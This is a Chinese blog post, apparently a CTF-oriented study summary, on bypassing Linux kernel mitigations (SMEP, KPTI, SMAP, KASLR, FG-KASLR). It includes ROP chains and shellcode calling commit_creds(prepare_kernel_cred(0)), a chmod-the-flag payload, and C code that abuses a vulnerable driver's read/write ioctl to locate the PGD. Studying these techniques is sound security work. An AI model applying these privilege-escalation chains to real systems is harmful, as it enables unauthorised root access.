**作者：时钟@RainSec  
原文链接：<https://mp.weixin.qq.com/s/gSTbXW6M72QYtVPoZswhyw>**

## 前言

好久没搞kernel的洞了，最近分析的这方面的洞有点多，相关的Exp任务也比较多，因此学习总结一下方便查找和记忆。

## SMEP + KPTI bypass

SMEP是SupervisorModeExecutionPrevention的缩写，主要的作用其实就是抵御类似ret2user这样的攻击，简单来说就是阻止内核执行用户态传递的代码。

检测计算机是否开启SMEP保护的方式很简单，`cat /proc/cpuinfo | grep
smep`，如果有匹配到一些信息的话就说明计算机开启了SMEP保护。在CTF赛事中一般会给一些kernel启动的sh脚本，从这些脚本里面我们也可以看出虚拟机在启动kernel时是否开启了SMEP保护：

    
    
    #!/bin/sh
    
    qemu-system-x86_64 -initrd initramfs.cpio \
    -kernel bzImage \
    -append 'console=ttyS0 oops=panic panic=1 nokaslr' \
    -monitor /dev/null \
    -m 64M --nographic \
    -smp cores=1,threads=1 \

这里是没开启SMEP的脚本，如果在脚本里面加入SMEP相关的cpu参数那么就是开启了SMEP机制。

    
    
    #!/bin/sh
    
    qemu-system-x86_64 -initrd initramfs.cpio \
    -kernel bzImage \
    -append 'console=ttyS0 oops=panic panic=1 nokaslr' \
    -monitor /dev/null \
    -m 64M --nographic \
    -smp cores=1,threads=1 \
    -cpu kvm64,smep

还有一种判断SMEP机制是否开启的方法是通过cr4寄存器的值：![image-20220319114934180](https://images.seebug.org/content/images/2022/03/28/1648452177000-1zgtfz.png-w331s)

第20位代表的就是SMEP机制是否开启，获取cr4寄存器值的方法也很简单，一种可以通过debuger去attach要调试的kernel，另一种就是通过触发SMEP机制的crash![image-20220319123657869](https://images.seebug.org/content/images/2022/03/28/1648452216000-2jqcbc.png-w331s)

KPTI机制更多的是一种页表隔离的机制，当在用户态和内核态之间进行状态切换的时候KPTI机制会尽量减少用户态页表中的内核地址，同时内核页表中所有的用户态页都被设置为NX使得用户态的页不具备可执行权限，这是一种防范`Meltdown`类似攻击的机制。

检测KPTI机制是否开启的方法有很多，`cat /proc/cpuinfo | grep pti`或者类似上面说到的cpu参数`-cpu
kvm64,smep`，或者检查进程页表，但是这需要你可以查看物理内存，通过内核任意读取的原语可以做到，但是需要进行虚拟地址和物理地址之间的转换，这就需要你具备一定的内存管理知识和多级页表相关知识，这些基础知识这里就不细说了，下面举例一些demo看如何获取相关物理地址。

    
    
    void *pgd = get_current()->mm->pgd;

get_current()
会帮助获取当前的`task_struct`，然后得到`mm_struct`结构体类型的mm成员，所有的进程地址空间都包含该结构体里面，其中pgd字段代表的是全局页目录，拿到地址之后进行页表地址转换就可以拿到对应的物理地址，那么在多级页表的处理过程中可以拿到每一级页表的入口地址，该地址的NX
bit就表明该页表是否开启了NX，结论就是，正常情况下每一级页表的NX位是没设置的，但是全局页目录设置了NX
bit，因为在多级页表解析的过程中全局页目录是共享的。

### ROP绕过

内核里面的rop和用户态其实是非常相似的，做rop最基本的就是先获取到`vmlinux`，以ctf赛题来说一般提供的都是压缩后的bzImage，这里可以通过[vmlinux-to-elf](https://github.com/marin-m/vmlinux-to-elf)工具来实现解压缩：

    
    
    ./vmlinux-to-elf <input_kernel.bin> <output_kernel.elf>

然后通过ROPgadget或者ropper从vmlinux里面获取gadget

    
    
    ROPgadget --binary vmlinux > gadgets

gadget的寻找原则其实不是固定的，要看场景丁需求，不过类似`mov esp, 0xf7000000 ;
ret`这样的一般都很不错（注意常量一定要对齐），可以将esp指向我们分配的地址然后接下来的ret操作就容易被控制进而执行rop链。但是ROPgadget是不会检查相关段是否开启了NX的。

对于SMEP来说，它由`cr4`寄存器控制，因此可以通过改变`cr4`寄存器的第20
bit的值来进行绕过，比如使用`native_write_cr4`函数：

    
    
    void native_write_cr4(unsigned long val)
    {
        unsigned long bits_missing = 0;
    
    set_register:
        asm volatile("mov %0,%%cr4": "+r" (val), "+m" (cr4_pinned_bits));
    
        if (static_branch_likely(&cr_pinning)) {
            if (unlikely((val & cr4_pinned_bits) != cr4_pinned_bits)) {
                bits_missing = ~val & cr4_pinned_bits;
                val |= bits_missing;
                goto set_register;
            }
            /* Warn after we've set the missing bits. */
            WARN_ONCE(bits_missing, "CR4 bits went missing: %lx!?\n",
                  bits_missing);
        }
    }
    EXPORT_SYMBOL(native_write_cr4);

但是从代码里面的警告就可以看出，在较新版本的内核中，该函数已经不能改变第20bit和第21bit的值了，

对于`KPTI`就比较麻烦了，一种方法是如果具备内核任意读写和当前进程页表的地址，那么就可以直接通过关闭NX
bit来实现，但是都任意读写了，直接修改cred结构体可能会更香一点。那么最好的方式其实应该去利用kernel本身的代码来帮助实现这一绕过过程，下面是[kernel
entry](https://github.com/torvalds/linux/blob/7ac63f6ba5db5e2e81e4674551d6f9ec58e70618/arch/x86/entry/entry_64.S)的部分代码，主要是用于内核态到用户态的切换，这其实很符合exp的需求，原本exp不能成功执行的主要原因就是在返回用户态之后执行的代码所在页其实属于内核，这个切换它成功的进行了页表切换，因接下来用到的就是用户态的页表，。

    
    
    GLOBAL(swapgs_restore_regs_and_return_to_usermode)
    #ifdef CONFIG_DEBUG_ENTRY
        /* Assert that pt_regs indicates user mode. */
        testb   $3, CS(%rsp)
        jnz 1f
        ud2
    1:
    #endif
        POP_REGS pop_rdi=0
    
        /*
         * The stack is now user RDI, orig_ax, RIP, CS, EFLAGS, RSP, SS.
         * Save old stack pointer and switch to trampoline stack.
         */
        movq    %rsp, %rdi
        movq    PER_CPU_VAR(cpu_tss_rw + TSS_sp0), %rsp
    
        /* Copy the IRET frame to the trampoline stack. */
        pushq   6*8(%rdi)   /* SS */
        pushq   5*8(%rdi)   /* RSP */
        pushq   4*8(%rdi)   /* EFLAGS */
        pushq   3*8(%rdi)   /* CS */
        pushq   2*8(%rdi)   /* RIP */
    
        /* Push user RDI on the trampoline stack. */
        pushq   (%rdi)
    
        /*
         * We are on the trampoline stack.  All regs except RDI are live.
         * We can do future final exit work right here.
         */
        STACKLEAK_ERASE_NOCLOBBER
    
        SWITCH_TO_USER_CR3_STACK scratch_reg=%rdi
    
        /* Restore RDI. */
        popq    %rdi
        SWAPGS
        INTERRUPT_RETURN

到此，其实就不难理解为什么kernel exp里面很多类似这样的ROP code:

    
    
        pivot_stack[0] = 0xcafedeadbeef;
    
        pivot_stack[i++] = pop_rdi;
        pivot_stack[i++] = 0;
        pivot_stack[i++] = prepare_kernel_cred;
        pivot_stack[i++] = pop_rdx;
        pivot_stack[i++] = 8;
        pivot_stack[i++] = cmp;
        pivot_stack[i++] = mov_rdi_rax;
        pivot_stack[i++] = commit_creds;
    
        pivot_stack[i++] = kpti_trampoline;
        pivot_stack[i++] = 0x12345678; // RAX
        pivot_stack[i++] = 0x87654321; // RDI
        pivot_stack[i++] = (unsigned long)u_code; //userspace_rip;
        pivot_stack[i++] = 0x33; //userspace_cs;
        pivot_stack[i++] = 0x246; //userspace_rflags;
        pivot_stack[i++] = (unsigned long)u_stack; //userspace_rsp;
        pivot_stack[i++] = 0x2b; //userspace_ss;

至于最开始的0xcafedeadbeef，这其实是为了触发`page fault handler`，因此根据linux demand-on-paging的原则，只有触发该handler的情况下才会真正mmaping。

还有一种方法是通过[signal
handler](https://trungnguyen1909.github.io/blog/post/matesctf/KSMASH/)。

### get root

获取root权限的方式在内核里面还算比较统一的，基本很多都是通过

  1. `commit_creds(prepare_kernel_cred(0))`。
  2. 确定cred structure结构体的地址来进行权限提升。
  3. ctf里面可能会用到的方法就是通过chmod 修改flag文件为777权限然后挂起，然后通过用户空间的一个进程来读取文件内容。

那么shellcode的写法就比较直接了，假设通过`cat /proc/kallsyms`得到了`grep commit_creds`和`grep
prepare_kernel_cred`的地址：

    
    
    xor rdi, rdi
    mov rcx, prepare_kernel_cred_addr
    call rcx
    mov rdi, rax
    mov rcx, commit_creds_addr
    call rcx
    ret

这种shellcode没有做内核地址空间与用户地址空间的转换，因此可能比较局限，适用于仅仅存在一个`retun
0`类似指令的目标函数。为了适配更多的场景，需要做内核态和用户态的上下文切换，在linux kernel
[源码](https://github.com/torvalds/linux/blob/master/arch/x86/entry/entry_64.S)中详细介绍了如何进入内核态：

> 64-bit SYSCALL saves rip to rcx, clears rflags.RF, then saves rflags to
> r11,then loads new ss, cs, and rip from previously programmed MSRs.rflags
> gets masked by a value from another MSR (so CLD and CLACare not needed).
> SYSCALL does not save anything on the stackand does not change rsp.
>
> 注：[MSR](https://wiki.osdev.org/Model_Specific_Registers)

从内核态返回用户态可以通过Linux提供的一些指令`SYSRET`，`SYSEXIT`，`IRET`，其中SYSRET和IRET可以适用于所有的CPU供应商，并且被包含在`x86_64`的标准里面，SYSRET需要利用MSR特殊读写指令因而较为麻烦，因此一般采用`IRET`。该指令的含义就是从中断返回，通过查看AMD64手册可以看出在保护模式下`IRET`对应`IRETQ`，那么我们只需要在执行`IRETQ`之前按顺序放置好RIP,
CS, RFLAGS, RSP, SS，最后还需要知道的时候`swapgs`指令，它的语义是：Exchange GS base with
KernelGSBase MSR，在linux syscall entry的代码哪里也存在该指令的调用，因此在通过system
call返回用户空间的时候我们需要再做一次`swapgs`用于恢复GS。

    
    
    swapgs
    
    push userspace_ss
    push userspace_rsp
    push userspace_rflags
    push userspace_cs
    push userspace_rip
    iretq

还有一种方法就是上述的第三条，第一步需要先找到chmod func的地址：

![image-20220320092704328](https://images.seebug.org/content/images/2022/03/28/1648452227000-3lpoga.png-w331s)

可以看到`__x64_sys_chmod`的地址是`0xffffffff872dacf0`，在内核调试中对该地址下断点就可以得到该如何给它附加参数：

    
    
        movzx  edx, word ptr [rdi + 0x68]
        mov    rsi, qword ptr [rdi + 0x70]
        mov    edi, 0xffffff9c
        call   0xffffffff811a1b50

不过要记得，`/flag`字符串存放地址应该使用内核空间地址，同时由于Linux kernel本身采用的是 **Non-Preemptive
Threading Model** ，因此在kernel
thred的执行过程中一般不会进行上下文切换，除非调用了特殊的API，通过sleep当前thread其实就是一个很好的迫使kernel进行上下文切换的，当然kernel里面的sleep和用户态有很大的差别，需要调用不同的API，这里我选择的是msleep():

![image-20220320101601670](https://images.seebug.org/content/images/2022/03/28/1648452236000-4ykztw.png-w331s)

那么，完整的shellcode就有了：

    
    
    ; commit_cred(prepare_kernel_creds(0))
    xor rdi, rdi
    mov rcx, prepare_kernel_cred_addr
    call rcx
    mov rdi, rax
    mov rcx, commit_creds_addr
    call rcx
    
    ; chmod 777 flag
    mov r15, 0x67616c662f
    mov r14, 0xdeadf00
    mov [r14], r15
    mov rdi, 0xffffff9c
    mov rsi, r14
    mov rdx, 0777
    mov rcx, x64_chmod_addr
    call rcx
    
    ; msleep(0x1000000)
    mov rdi, 0x1000000
    mov rcx, msleep_addr
    call rcx
    int 3

然后我们让exp在后台执行，前台执行`cat flag`实现文件读取。

### 总结

在通过ROP编写shellcode的时候要注意两点：

  1. 在exp中的mmap产生的shellcode地址不在之前kernel访问的页表里面，那么在执行的时候就会触发[double fault](https://en.wikipedia.org/wiki/Double_fault#:~:text=On%20the%20x86%20architecture%2C%20a,interrupt%20handler%20resides%20is%20invalid.)。
  2. 栈指针必须在向上向下两个方向上都还剩比较宽阔的空间`unsigned long *pivot_stack = mmap((void *)0xf7000000-0x1000, 0x1000+0x1000, PROT_READ|PROT_WRITE|PROT_EXEC, MAP_ANONYMOUS|MAP_PRIVATE|MAP_FIXED, -1, 0);`，因为Linux kernel func 比如 `commit_creds`需要使用栈空间并且不能使用低于0xf7000000大小的地址，否则会引起uncatchable page fault，`MAP_GROWSDOWN`是无效的，因为它只能用于用户态。

## SMEP+PTI+SMAP+KASLR bypass

> KASLR就不多解释了，就是一个kernel的地址随机化

### SMAP

SMAP是`Supervisor Mode Access Prevention`，它使得用户态的指针无法在内核态被解引用，这无疑会使得ROP难以有效使用。

在qemu里面`-cpu kvm64,smep,smap`表明开启了SMAP机制，当然`cat /proc/cpuinfo | grep
smap`也可以看出来。

### SMAP bypass

通过分析linux kernel的mmap实现其实就可以知道我们可以通过类似linux kernel heap
spray的方式将用户空间的代码映射到内核里面，只需要用 **MAP_POPULATE** 的flag:

    
    
           MAP_POPULATE (since Linux 2.5.46)
                  Populate (prefault) page tables for a mapping.  For a file mapping, this causes read-ahead on the file.  This will help to reduce blocking on page faults later.  The mmap() call doesn't fail if the mapping cannot be populated (for example, due to limitations on the number of mapped huge pages when using MAP_HUGETLB).  MAP_POPULATE is supported for private mappings only since Linux 2.6.23.

这是因为在通过该flag进行mmap的时候，物理页也会同时被映射而不是想之前按需映射的方式。下面是一个github提供的demo可以测算可mmap的地址大小：

    
    
    #include <stdio.h>
    #include <unistd.h>
    #include <stdlib.h>
    #include <sys/fcntl.h>
    #include <sys/mman.h>
    #include <sys/stat.h>
    
    int main (int argc, char **argv){
        int cnt = 0;
        void *pg;
    
        while(1) {
            pg = mmap(NULL, 0x1000, PROT_READ|PROT_WRITE, MAP_ANONYMOUS|MAP_PRIVATE|MAP_POPULATE, -1, 0);
            if (pg == MAP_FAILED) {
                perror("mmap");
                break;
            }
            else {
                cnt++;
                if (cnt % 1000 == 0) {
                    printf("[*] allocated %d pages, asking for more...\n", cnt);
                }
            }
        }
    
        printf("[*] number of pages allocated: %d\n", cnt);
        return 0;
    }

通过实验得出结论就是尽管RAM很小，但是最大mmap的值是它的数倍，同时该值会根据内存资源的大小来发生变化。同时物理页的分配有一个特点，
**那就是它们一般都是连续分配的**
。如此通过大量的mmap地址并填充信息，最终其实是可以在内核里面访问到这些信息的，如此就可以绕过SMAP的保护，因为我们不需要再解析用户态的指针，而是通过内核地址进行代码执行。

那么应该如何获得物理地址呢？通过[文档](https://www.kernel.org/doc/gorman/html/understand/understand006.html)发现，在Linux中每一个进程都维护一个指针`mm_struct->pgd`指向该进程的
**Page Global Directory (PGD)**
，表里面包含的是`pgd_t`数组，pgd_t定义在`asm/page.h`里面根据不同的架构拥有不同的值，在x86架构下`mm_struct->pgd`会被复制到cr3寄存器。

![image-20220321164429738](https://images.seebug.org/content/images/2022/03/28/1648452245000-5wlvps.png-w331s)

可以知道通过mmap拿到的是虚拟地址，因此需要做一个虚拟地址到屋里地址之间的转换，那么如何获取cr3或者说pgd的值呢，一方面可以通过内核获取另一方面可以通过`/proc/(pid)/pagemap`获取，还有一种很奇特的方法即是通过映射64bit的[39:48]形成的地址，这里一共是0xff个地址，此时在物理页表中就会生成大量稠密的地址，这些地址会有一些特征，比如：

  1. 最高位为1。
  2. 最低字节为0x67。

那么就可以通过遍历内核地址（一般从pageOffsetBase + (0x7c000 <<
12)开始）中的值来判断是否符合自己刚才通过spraying注入的大量地址，如果一个地址的内容符合自己注入的地址，同时索引0x100的结果为0，那么基本就能确定PGD的地址了。

    
    
    #include <stdio.h>
    #include <unistd.h>
    #include <stdlib.h>
    #include <sys/fcntl.h>
    #include <sys/mman.h>
    #include <sys/stat.h>
    #include <string.h>
    
    #define VULN_READ 0x1111
    #define VULN_WRITE 0x2222
    #define VULN_STACK 0x3333
    #define VULN_PGD 0x4444
    #define VULN_PB 0x5555
    
    #define SPRAY_CNT 0x10000
    
    struct rwRequest {
        void *kaddr;
        void *uaddr;
        size_t length;
    };
    
    unsigned long pageOffsetBase = 0xffff888000000000;
    
    int Open(char *fname, int mode) {
        int fd;
        if ((fd = open(fname, mode)) < 0) {
            perror("open");
            exit(-1);
        }
        return fd;
    }
    
    void write64(unsigned long kaddr, unsigned long value) {
    
        struct rwRequest req;
        unsigned long value_ = value;
    
        req.uaddr = &value_;
        req.length = 8;
        req.kaddr = (void *)kaddr;
    
        int fd = Open("/dev/vuln", O_RDONLY);
    
        if (ioctl(fd, VULN_WRITE, &req) < 0) {
            perror("ioctl");
            exit(-1);
        }
    }
    
    unsigned long read64(unsigned long kaddr) {
    
        struct rwRequest req;
        unsigned long value;;
    
        req.uaddr = &value;
        req.length = 8;
        req.kaddr = (void *)kaddr;
    
        int fd = Open("/dev/vuln", O_RDONLY);
    
        if (ioctl(fd, VULN_READ, &req) < 0) {
            perror("ioctl");
            exit(-1);
        }
    
        close(fd);
    
        return value;
    }
    
    unsigned long leak_stack() {
        struct rwRequest req;
        unsigned long stack;
    
        int fd = Open("/dev/vuln", O_RDONLY);
    
        req.uaddr = &stack;
        if (ioctl(fd, VULN_STACK, &req) < 0) {
            perror("ioctl");
            exit(-1);
        }
    
        close(fd);
    
        return stack;
    }
    
    unsigned long leak_pgd() {
        struct rwRequest req;
        unsigned long pgd = 0xcccccccc;
    
        int fd = Open("/dev/vuln", O_RDONLY);
    
        req.uaddr = &pgd;
        if (ioctl(fd, VULN_PGD, &req) < 0) {
            perror("ioctl");
            exit(-1);
        }
    
        close(fd);
    
        return pgd;
    }
    
    unsigned long leak_physmap_base() {
        struct rwRequest req;
        unsigned long pgd = 0xcccccccc;
    
        int fd = Open("/dev/vuln", O_RDONLY);
    
        req.uaddr = &pgd;
        if (ioctl(fd, VULN_PB, &req) < 0) {
            perror("ioctl");
            exit(-1);
        }
    
        close(fd);
    
        return pgd;
    }
    
    int check_page(unsigned long addr) {
    
        unsigned long page[0x101];
    
        for (int i = 0; i < 0x101; i++) {
            page[i] = read64(addr + i*8);
        }
        for (int i = 0; i < 0x100; i++) {
            if (((page[i] & 0xff) != 0x67) || (!(page[i] >> 63))) {
                return 0;
            }
        }
    
        return page[0x100] == 0;
    }
    
    int main (int argc, char **argv){
    
        void *pg;
        unsigned long search_addr;
    
        search_addr = pageOffsetBase + (0x7c000 << 12);
    
        for (unsigned long i = 1; i < 0x100; i++) {
            pg = mmap((void *)(i << 39), 0x1000, PROT_READ|PROT_WRITE, MAP_POPULATE|MAP_PRIVATE|MAP_ANONYMOUS|MAP_FIXED, -1, 0);
            if (pg == MAP_FAILED) {
                perror("mmap");
                exit(-1);
            }
        }
    
        printf("[*] starting search from addr %p\n", (void *)search_addr);
    
        while(1) {
            if (check_page(search_addr)) {
                printf("[+] located the PGD: %p\n", (void *)search_addr);
                break;
            }
            search_addr += 0x1000;
        }
    
        printf("[*] this is the actual PGD: %p\n", (void *)leak_pgd());
    
        return 0;
    }

如此可以在用户空间通过大量的mmap，然后拿到其物理地址，然后通过内核态的地址转换将该物理地址转换为内核的虚拟地址通过kernel
module进行读取就会发现内核可以读取到用户态的数据。

如此就知道绕过的原理了，总结一下就是通过内核空间和用户空间确定相同的物理页然后让kernel进行代码执行。

### KASLR bypass

KASLR其实就是内核态的地址随机化，类似用户态的做法，bypass可以通过确定基地址然后加上固定偏移来解决。但是观察`/proc/kallsyms`的内容发现一些符号其实是完全自己在随机，而不是拥有一个固定的偏移，这就引出了Linux
Kernel的一个机制[Function Granular
KASLR](https://lwn.net/Articles/824307/)，简单来说就是内核在加载的时候会以函数级别重新排布内核代码。

但是FG-KASLR并不完善，一些内核区域并不会随机化：

  1. 不幸，commit_creds 和 prepare_kernel_cred在FG-KASLR的区域。
  2. swapgs_restore_regs_and_return_to_usermode和__x86_retpoline_r15函数不受到FG-KASLR影响，这能帮助找到一些gadget。
  3. 内核符号表ksymtab不受影响，这里存储了一些偏移可以用于计算prepare_kernel_cred和commit_creds的地址。

第三个比较感兴趣：

    
    
    struct kernel_symbol {
          int value_offset;
          int name_offset;
          int namespace_offset;
    };

可以看出`value_offset`应该是比较有趣的，这个对应的值也可以通过`/proc/kallsyms`获取：

![image-20220323092910382](https://images.seebug.org/content/images/2022/03/28/1648452252000-6nftlw.png-w331s)

因此一般就可以在ROP中利用任意读读出相对应的偏移用于计算其它函数的具体位置。

## 总结

网上看到一段总结，感觉很不错：

  1. 如果内核没有保护，就直接ret2usr。
  2. 如果开了SMEP，就用ROP
  3. 溢出或者位置被限制在栈上，就用pivot gadget进行栈迁移。
  4. KPTI利用KPTI trampoline或者signal handler
  5. SMAP会导致stack pivot很难利用
  6. 如果没有KASLR，直接泄露地址就能用，开了的话就用基地址 + 偏移。
  7. 如果有FG-KASLR，记得利用ksymtab和不受影响的区域。

## 参考链接

> <https://lkmidas.github.io/posts/20210123-linux-kernel-pwn-part-1/>
> <https://github.com/pr0cf5/kernel-exploit-practice>

* * *

![Paper](https://images.seebug.org/content/images/2017/08/0e69b04c-e31f-4884-8091-24ec334fbd7e.jpeg)
本文由 Seebug Paper 发布，如需转载请注明来源。本文地址：<https://paper.seebug.org/1865/>

